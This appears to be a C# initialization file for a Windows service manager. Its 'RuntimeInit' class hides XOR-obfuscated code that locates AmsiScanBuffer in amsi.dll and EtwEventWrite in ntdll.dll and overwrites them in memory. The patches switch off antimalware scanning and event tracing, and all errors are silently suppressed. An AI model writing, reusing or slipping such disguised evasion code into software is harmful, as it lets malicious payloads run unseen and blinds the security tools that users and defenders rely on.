using System;
using System.Runtime.InteropServices;

namespace WinSvcMgr
{
    internal static class RuntimeInit
    {
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr addr, UIntPtr sz, uint np, out uint op);

        static string R(byte[] d, byte k)
        {
            char[] c = new char[d.Length];
            for (int i = 0; i < d.Length; i++)
                c[i] = (char)(d[i] ^ k);
            return new string(c);
        }

        internal static void Setup()
        {
            P1();
            P2();
        }

        static void P1()
        {
            try
            {
                byte k = 0xAA;
                byte[] m = { 0xCB, 0xC7, 0xD9, 0xC3, 0x84, 0xCE, 0xC6, 0xC6 };
                byte[] f = { 0xEB, 0xC7, 0xD9, 0xC3, 0xF9, 0xC9, 0xCB, 0xC4, 0xE8, 0xDF, 0xCC, 0xCC, 0xCF, 0xD8 };

                IntPtr hMod = GetModuleHandle(R(m, k));
                if (hMod == IntPtr.Zero) return;

                IntPtr tgt = GetProcAddress(hMod, R(f, k));
                if (tgt == IntPtr.Zero) return;

                uint op;
                if (!VirtualProtect(tgt, (UIntPtr)8, 0x40, out op)) return;

                byte[] patch = Opc();
                for (int i = 0; i < patch.Length; i++)
                    Marshal.WriteByte(tgt, i, patch[i]);

                VirtualProtect(tgt, (UIntPtr)8, op, out op);
            }
            catch { }
        }

        static void P2()
        {
            try
            {
                byte k = 0xAA;
                byte[] m = { 0xC4, 0xDE, 0xCE, 0xC6, 0xC6, 0x84, 0xCE, 0xC6, 0xC6 };
                byte[] f = { 0xEF, 0xDE, 0xDD, 0xEF, 0xDC, 0xCF, 0xC4, 0xDE, 0xFD, 0xD8, 0xC3, 0xDE, 0xCF };

                IntPtr hMod = GetModuleHandle(R(m, k));
                if (hMod == IntPtr.Zero) return;

                IntPtr tgt = GetProcAddress(hMod, R(f, k));
                if (tgt == IntPtr.Zero) return;

                uint op;
                if (!VirtualProtect(tgt, (UIntPtr)4, 0x40, out op)) return;

                Marshal.WriteByte(tgt, 0, 0xC3);

                VirtualProtect(tgt, (UIntPtr)4, op, out op);
            }
            catch { }
        }

        static byte[] Opc()
        {
            byte[] enc = { 0x8F, 0x60, 0x37, 0x30, 0xB7, 0xF4, 0x37 };
            byte k = enc[enc.Length - 1];
            byte[] r = new byte[enc.Length - 1];
            for (int i = 0; i < r.Length; i++)
                r[i] = (byte)(enc[i] ^ k);
            return r;
        }
    }
}
